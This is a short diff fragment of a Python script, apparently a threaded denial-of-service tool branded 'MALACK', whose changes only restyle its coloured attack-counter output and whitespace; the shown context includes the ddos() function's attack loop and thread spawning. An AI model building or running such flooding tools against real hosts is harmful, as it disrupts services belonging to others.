@@ -66,15 +66,15 @@ def ddos():
 
                 time.sleep(2)
                 attack_num += 1
-                print(f"{Fore.LIGHTBLUE_EX}M A L A C K {Fore.YELLOW}" +str(attack_num))
-                print(f"{Fore.LIGHTBLUE_EX}M A L A C K {Fore.YELLOW}" +str(ip)+")")
+                print(f"{Fore.LIGHTWHITE_EX}[]  {Fore.LIGHTCYAN_EX}M A L A C K  \033[103mSent massage\033[0m  \033[41m"+ str(attack_num)+"\033[0m \033[94m Starting-info\033[0")
+                print(f"{Fore.LIGHTRED_EX}[]  {Fore.LIGHTBLUE_EX}M A L A C K  \033[7mSent massage\033[0m  \033[103m"+ str(attack_num)+"\033[0m \033[31m Starting-info\033[0m")
             except socket.error:
                 time.sleep(2)
                 print(f"{Fore.BLUE}[]  {Fore.YELLOW}Connection failed   \033[7m please check host\033[0m")
                 print(f"{Fore.YELLOW}[]  {Fore.BLUE}Connection failed   \033[101m please check host\033[0m")
                 break
                 s.close()
-
+                
     for i in range(threads):
         thread = threading.Thread(target=attack)
         thread.start()
